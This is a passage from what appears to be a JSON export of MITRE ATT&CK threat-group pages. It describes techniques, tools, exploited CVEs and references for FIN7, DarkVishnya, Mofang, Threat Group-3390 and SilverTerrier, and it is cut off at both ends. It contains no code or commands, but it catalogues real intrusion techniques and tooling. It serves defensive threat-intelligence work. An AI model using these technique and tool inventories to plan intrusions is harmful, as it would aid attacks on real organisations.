Impact, Deobfuscate/Decode Files or Information, Drive-by Compromise, Encrypted Channel: Asymmetric Cryptography, Execution Guardrails: Mutual Exclusion, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Safe Mode Boot, Impair Defenses: Disable or Modify Tools, Indicator Removal: File Deletion, Ingress Tool Transfer, Inhibit System Recovery, Loss of Productivity and Revenue, Masquerading: Match Legitimate Resource Name or Location, Masquerading, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Fileless Storage, Permission Groups Discovery: Domain Groups, Phishing: Spearphishing Attachment, Process Injection, Query Registry, Remote Services, Scripting, Service Stop, Service Stop, Standard Application Layer Protocol, System Information Discovery, System Location Discovery: System Language Discovery, System Service Discovery, Theft of Operational Information, User Execution: Malicious File, User Execution, Windows Management Instrumentation S0390 SQLRat [12] Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Command Obfuscation, Scheduled Task/Job: Scheduled Task, User Execution: Malicious File S0146 TEXTMATE [1] Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell References Miller, S., et al. (2017, March 7). FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings. Retrieved March 8, 2017. Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017. Bennett, J., Vengerik, B. (2017, June 12). Behind the CARBANAK Backdoor. Retrieved June 11, 2018. Carr, N., et al. (2018, August 01). On the Hunt for FIN7: Pursuing an Enigmatic and Evasive Global Criminal Operation. Retrieved August 23, 2018. Loui, E. and Reynolds, J. (2021, August 30). CARBON SPIDER Embraces Big Game Hunting, Part 1. Retrieved September 20, 2021. Abdo, B., et al. (2022, April 4). FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7. Retrieved April 5, 2022. CTU. (n.d.). GOLD NIAGARA. Retrieved September 21, 2021. Singleton, C. and Kiefer, C. (2020, September 28). Ransomware 2020: Attack Trends Affecting Organizations Worldwide. Retrieved September 20, 2021. Microsoft. (2022, May 9). Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself. Retrieved March 10, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. eSentire. (2021, July 21). Notorious Cybercrime Gang, FIN7, Lands Malware in Law Firm Using Fake Legal Complaint Against Jack Daniels\u2019 Owner, Brown-Forman Inc.. Retrieved September 20, 2021. Platt, J. and Reeves, J.. (2019, March). FIN7 Revisited: Inside Astra Panel and SQLRat Malware. Retrieved June 18, 2019. Gorelik, M.. (2017, June 9). FIN7 Takes Another Bite at the Restaurant Industry. Retrieved July 13, 2017. The Record. (2022, January 7). FBI: FIN7 hackers target US companies with BadUSB devices to install ransomware. Retrieved January 14, 2022. Carr, N, et all. (2019, October 10). Mahalo FIN7: Responding to the Criminal Operators\u2019 New Tools and Techniques. Retrieved October 11, 2019. Erickson, J., McWhirt, M., Palombo, D. (2017, May 3). To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence. Retrieved July 18, 2017. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Department of Justice. (2018, August 01). HOW FIN7 ATTACKED AND STOLE DATA. Retrieved August 24, 2018. Waterman, S. (2017, October 16). Fin7 weaponization of DDE is just their latest slick move, say researchers. Retrieved November 21, 2017. Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. Namestnikov, Y. and Aime, F. (2019, May 8). FIN7.5: the infamous cybercrime rig \u201cFIN7\u201d continues its activities. Retrieved October 11, 2019. Seals, T. (2021, May 14). FIN7 Backdoor Masquerades as Ethical Hacking Tool. Retrieved February 2, 2022. Gemini Advisory. (2021, October 21). FIN7 Recruits Talent For Push Into Ransomware. Retrieved February 2, 2022. Trustwave SpiderLabs. (2020, June 22). Pillowmint: FIN7\u2019s Monkey Thief . Retrieved July 27, 2020. "
},
{
"id": 147,
"title": "DarkVishnya, Group G0105",
"path": "/groups/G0105/index.html",
"content": " DarkVishnya DarkVishnya is a financially motivated threat actor targeting financial institutions in Eastern Europe. In 2017-2018 the group attacked at least 8 banks in this region.[1] ID: G0105 Version: 1.1 Created: 15 May 2020 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1110 Brute Force DarkVishnya used brute-force attack to obtain login data.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell DarkVishnya used PowerShell to create shellcode loaders.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service DarkVishnya created new services for shellcode loaders distribution.[1] Enterprise T1200 Hardware Additions DarkVishnya physically connected Bash Bunny, Raspberry Pi, netbooks, and inexpensive laptops to the target organization's environment to access the company\u2019s local network.[1] Enterprise T1046 Network Service Discovery DarkVishnya performed port scanning to obtain the list of active services.[1] Enterprise T1135 Network Share Discovery DarkVishnya scanned the network for public shared folders.[1] Enterprise T1040 Network Sniffing DarkVishnya used network sniffing to obtain login data. [1] Enterprise T1571 Non-Standard Port DarkVishnya used ports 5190 and 7900 for shellcode listeners, and 4444, 4445, 31337 for shellcode C2.[1] Enterprise T1588 .002 Obtain Capabilities: Tool DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec.[1] Enterprise T1219 Remote Access Tools DarkVishnya used DameWare Mini Remote Control for lateral movement.[1] Software ID Name References Techniques S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0191 Winexe [1] System Services: Service Execution References Golovanov, S. (2018, December 6). DarkVishnya: Banks attacked through direct connection to local network. Retrieved May 15, 2020. "
},
{
"id": 148,
"title": "Mofang, Group G0103",
"path": "/groups/G0103/index.html",
"content": " Mofang Mofang is a likely China-based cyber espionage group, named for its frequent practice of imitating a victim's infrastructure. This adversary has been observed since at least May 2012 conducting focused attacks against government and critical infrastructure in Myanmar, as well as several other countries and sectors including military, automobile, and weapons industries.[1] ID: G0103 Version: 1.1 Created: 12 May 2020 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Mofang has encrypted payloads before they are downloaded to victims.[1] .015 Obfuscated Files or Information: Compression Mofang has compressed the ShimRat executable within malicious email attachments.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached.[1] .002 Phishing: Spearphishing Link Mofang delivered spearphishing emails with malicious links included.[1] Enterprise T1204 .001 User Execution: Malicious Link Mofang's spearphishing emails required a user to click the link to connect to a compromised website.[1] .002 User Execution: Malicious File Mofang's malicious spearphishing attachments required a user to open the file after receiving.[1] Software ID Name Techniques S0444 ShimRat Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Deobfuscate/Decode Files or Information, Event Triggered Execution: Application Shimming, Fallback Channels, File and Directory Discovery, Hijack Execution Flow, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Network Share Discovery, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Compression, Proxy: External Proxy, Scheduled Transfer S0445 ShimRatReporter Account Discovery, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Exfiltration Over C2 Channel, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information, Permission Groups Discovery, Process Discovery, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery References Yonathan Klijnsma. (2016, May 17). Mofang: A politically motivated information stealing adversary. Retrieved May 12, 2020. "
},
{
"id": 149,
"title": "Threat Group-3390, Earth Smilodon, TG-3390, Emissary Panda, BRONZE UNION, APT27, Iron Tiger, LuckyMouse, Group G0027",
"path": "/groups/G0027/index.html",
"content": " Threat Group-3390 Threat Group-3390 is a Chinese threat group that has extensively used strategic Web compromises to target victims.[1] The group has been active since at least 2010 and has targeted organizations in the aerospace, government, defense, technology, energy, manufacturing and gambling/betting sectors.[2][3][4] ID: G0027 \u24d8 Associated Groups: Earth Smilodon, TG-3390, Emissary Panda, BRONZE UNION, APT27, Iron Tiger, LuckyMouse Contributors: Daniyal Naeem, BT Security; Kyaw Pyiyt Htet, @KyawPyiytHtet Version: 2.2 Created: 31 May 2017 Last Modified: 10 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Earth Smilodon [5] TG-3390 [1][6][7] Emissary Panda [8][6][3][7][9][5] BRONZE UNION [2][6] APT27 [6][3][7][5] Iron Tiger [7][5] LuckyMouse [3][7][5] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.[6] Enterprise T1087 .001 Account Discovery: Local Account Threat Group-3390 has used net user to conduct internal discovery of systems.[2] Enterprise T1583 .001 Acquire Infrastructure: Domains Threat Group-3390 has registered domains for C2.[10] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Threat Group-3390 malware has used HTTP for C2.[3] Enterprise T1560 .002 Archive Collected Data: Archive via Library Threat Group-3390 has used RAR to compress, encrypt, and password-protect files prior to exfiltration.[2] Enterprise T1119 Automated Collection Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Threat Group-3390's malware can add a Registry key to Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[6][10] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Threat Group-3390 has used PowerShell for execution.[2][4] .003 Command and Scripting Interpreter: Windows Command Shell Threat Group-3390 has used command-line interfaces for execution.[2][9] Enterprise T1543 .003 Create or Modify System Process: Windows Service Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence.[6][10] Enterprise T1555 .005 Credentials from Password Stores: Password Managers Threat Group-3390 obtained a KeePass database from a compromised host.[4] Enterprise T1005 Data from Local System Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[2] Enterprise T1074 .001 Data Staged: Local Data Staging Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts.[2] .002 Data Staged: Remote Data Staging Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration.[2] Enterprise T1030 Data Transfer Size Limits Threat Group-3390 actors have split RAR files for exfiltration into parts.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During execution, Threat Group-3390 malware deobfuscates and decompresses code that was encoded with Metasploit\u2019s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[3] Enterprise T1189 Drive-by Compromise Threat Group-3390 has extensively used strategic web compromises to target victims.[1][3] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Threat Group-3390 has exfiltrated stolen data to Dropbox.[4] Enterprise T1190 Exploit Public-Facing Application Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.[5] Enterprise T1203 Exploitation for Client Execution Threat Group-3390 has exploited CVE-2018-0798 in Equation Editor.[5] Enterprise T1068 Exploitation for Privilege Escalation Threat Group-3390 has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.[2][11] Enterprise T1210 Exploitation of Remote Services Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.[9] Enterprise T1133 External Remote Services Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services.[1] Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[2] Enterprise T1574 .001 Hijack Execution Flow: DLL Threat Group-3390 has performed DLL search order hijacking to execute their payload.[6] Threat Group-3390 has also used DLL side-loading, including by using legitimate Kaspersky antivirus variants as well as rc.exe, a legitimate Microsoft Resource Compiler.[1][2][3][9][10] Enterprise T1562 .002 Impair Defenses: Disable Windows Event Logging Threat Group-3390 has used appcmd.exe to disable logging on a victim server.[2] Enterprise T1070 .004 Indicator Removal: File Deletion Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.[2][4] .005 Indicator Removal: Network Share Connection Removal Threat Group-3390 has detached network shares after exfiltrating files, likely to evade detection.[2] Enterprise T1105 Ingress Tool Transfer Threat Group-3390 has downloaded additional malware and tools, including through the use of certutil, onto a compromised host .[1][4] Enterprise T1056 .001 Input Capture: Keylogging Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.[1][7][3] Enterprise T1112 Modify Registry A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER\\Software\\Classes\\ and HKLM\\SYSTEM\\CurrentControlSet\\services.[6][5] Enterprise T1046 Network Service Discovery Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.[1][9] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing Threat Group-3390 has packed malware and tools, including using VMProtect.[4][5] .013 Obfuscated Files or Information: Encrypted/Encoded File A Threat Group-3390 tool can encrypt payloads using XOR. Threat Group-3390 malware is also obfuscated using Metasploit\u2019s shikata_ga_nai encoder.[6][3][9] .015 Obfuscated Files or Information: Compression Threat Group-3390 malware is compressed with LZNT1 compression.[6][3][9] Enterprise T1588 .002 Obtain Capabilities: Tool Threat Group-3390 has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor.[9][1] .003 Obtain Capabilities: Code Signing Certificates Threat Group-3390 has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations.[10] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.[1][2] .002 OS Credential Dumping: Security Account Manager Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.[1][2] .004 OS Credential Dumping: LSA Secrets Threat Group-3390 actors have used gsecdump to dump credentials. They have also dumped credentials from domain controllers.[1][2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Threat Group-3390 has used e-mail to deliver malicious attachments to victims.[4] Enterprise T1055 .012 Process Injection: Process Hollowing A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.[6][3] Enterprise T1012 Query Registry A Threat Group-3390 tool can read and decrypt stored Registry values.[6] Enterprise T1021 .006 Remote Services: Windows Remote Management Threat Group-3390 has used WinRM to enable remote execution.[2] Enterprise T1018 Remote System Discovery Threat Group-3390 has used the net view command.[6] Enterprise T1053 .002 Scheduled Task/Job: At Threat Group-3390 actors use at to schedule tasks to run self-extracting RAR archives, which install HTTPBrowser or PlugX on other victims on a network.[1] Enterprise T1505 .003 Server Software Component: Web Shell Threat Group-3390 has used a variety of Web shells.[9] Enterprise T1608 .001 Stage Capabilities: Upload Malware Threat Group-3390 has hosted malicious payloads on Dropbox.[4] .002 Stage Capabilities: Upload Tool Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites.[1] .004 Stage Capabilities: Drive-by Target Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.[8] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain Threat Group-3390 has compromised the Able Desktop installer to gain access to victim's environments.[5] Enterprise T1016 System Network Configuration Discovery Threat Group-3390 actors use NBTscan to discover vulnerable systems.[1] Enterprise T1049 System Network Connections Discovery Threat Group-3390 has used net use and netstat to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.[2] Enterprise T1033 System Owner/User Discovery Threat Group-3390 has used whoami to collect system user information.[4] Enterprise T1199 Trusted Relationship Threat Group-3390 has compromised third party service providers to gain access to victim's environments.[11] Enterprise T1204 .002 User Execution: Malicious File Threat Group-3390 has lured victims into opening malicious files containing malware.[4] Enterprise T1078 Valid Accounts Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[1] Enterprise T1047 Windows Management Instrumentation A Threat Group-3390 tool can use WMI to execute a binary.[6] Software ID Name References Techniques S0073 ASPXSpy Threat Group-3390 has used a modified version of ASPXSpy called ASPXTool.[1][11] Server Software Component: Web Shell S0160 certutil [4] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0020 China Chopper [1][2][6][9] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S0660 Clambling [4][11][5] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Data from Local System, Deobfuscate/Decode Files or Information, Exfiltration Over Web Service: Exfiltration to Cloud Storage, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Input Capture: Keylogging, Modify Registry, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Query Registry, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Services: Service Execution, System Time Discovery, User Execution: Malicious File, Video Capture, Virtualization/Sandbox Evasion: Time Based Evasion, Web Service: Bidirectional Communication S0154 Cobalt Strike [4] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0032 gh0st RAT [12] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0008 gsecdump [1] OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets S0070 HTTPBrowser [1][2][6][5] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information S0398 HyperBro [9][3][7][4][5] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Process Injection, Screen Capture, System Service Discovery, System Services: Service Execution S0357 Impacket [9] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [2] System Network Configuration Discovery S0002 Mimikatz Threat Group-3390 has used a modified version of Mimikatz called Wrapikatz.[2][6][4][13][11] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0590 NBTscan [1][4] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [4] System Network Connections Discovery S0664 Pandora [5] Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Encrypted Channel: Symmetric Cryptography, Exploitation for Privilege Escalation, Hijack Execution Flow: DLL, Ingress Tool Transfer, Modify Registry, Obfuscated Files or Information: Compression, Process Discovery, Process Injection, Subvert Trust Controls: Code Signing Policy Modification, System Services: Service Execution, Traffic Signaling S0013 PlugX [1][2][6][4][11] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0006 pwdump [9] OS Credential Dumping: Security Account Manager S0662 RCSession [5][4][11] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Fileless Storage, Process Discovery, Process Injection: Process Hollowing, Screen Capture, System Binary Proxy Execution: Msiexec, System Information Discovery, System Owner/User Discovery S0096 Systeminfo [4] System Information Discovery S0663 SysUpdate [5] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Systemd Service, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, Process Discovery, Screen Capture, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery: Internet Connection Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery, System Services: Service Execution, Windows Management Instrumentation S0057 Tasklist [4] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0005 Windows Credential Editor [1] OS Credential Dumping: LSASS Memory S0412 ZxShell [12] Access Token Manipulation: Create Process with Token, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, Command and Scripting Interpreter: Windows Command Shell, Create Account: Local Account, Create or Modify System Process: Windows Service, Data from Local System, Endpoint Denial of Service, Exploit Public-Facing Application, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, Query Registry, Remote Services: VNC, Remote Services: Remote Desktop Protocol, Screen Capture, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, System Service Discovery, System Services: Service Execution, Video Capture References Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, August 5). Threat Group-3390 Targets Organizations for Cyberespionage. Retrieved August 18, 2018. Counter Threat Unit Research Team. (2017, June 27). BRONZE UNION Cyberespionage Persists Despite Disclosures. Retrieved July 13, 2017. Legezo, D. (2018, June 13). LuckyMouse hits national data center to organize country-level waterholing campaign. Retrieved August 18, 2018. Lunghi, D. et al. (2020, February). Uncovering DRBControl. Retrieved November 12, 2021. Lunghi, D. and Lu, K. (2021, April 9). Iron Tiger APT Updates Toolkit With Evolved SysUpdate Malware. Retrieved November 12, 2021. Pantazopoulos, N., Henry T. (2018, May 18). Emissary Panda \u2013 A potential new malicious tool. Retrieved June 25, 2018. Khandelwal, S. (2018, June 14). Chinese Hackers Carried Out Country-Level Watering Hole Attack. Retrieved August 18, 2018. Gallagher, S.. (2015, August 5). Newly discovered Chinese hacking group hacked 100+ websites to use as \u201cwatering holes\u201d. Retrieved January 25, 2016. Falcone, R. and Lancaster, T. (2019, May 28). Emissary Panda Attacks Middle East Government Sharepoint Servers. Retrieved July 9, 2019. Daniel Lunghi. (2023, March 1). Iron Tiger\u2019s SysUpdate Reappears, Adds Linux Targeting. Retrieved March 20, 2023. Global Threat Center, Intelligence Team. (2020, December). APT27 Turns to Ransomware. Retrieved November 12, 2021. Counter Threat Unit Research Team. (2019, February 27). A Peek into BRONZE UNION\u2019s Toolbox. Retrieved September 24, 2019. Chen, T. and Chen, Z. (2020, February 17). CLAMBLING - A New Backdoor Base On Dropbox. Retrieved November 12, 2021. "
},
{
"id": 150,
"title": "SilverTerrier, Group G0083",
"path": "/groups/G0083/index.html",
"content": " SilverTerrier SilverTerrier is a Nigerian threat group that has been seen active since 2014. SilverTerrier mainly targets organizations in high technology, higher education, and manufacturing.[1][2] ID: G0083 Version: 1.2 Created: 29 January 2019 Last Modified: 27 September 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols SilverTerrier uses HTTP for C2 communications.[1] .002 Application Layer Protocol: File Transfer Protocols SilverTerrier uses FTP for C2 communications.[1] .003 Application Layer Protocol: Mail Protocols SilverTerrier uses SMTP for C2 communications.[1] Enterprise T1657 Financial Theft SilverTerrier targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.[1][2] Software ID Name References Techniques S0331 Agent Tesla [1] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Application Layer Protocol: Mail Protocols, Archive Collected Data, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Clipboard Data, Credentials from Password Stores: Credentials from Web 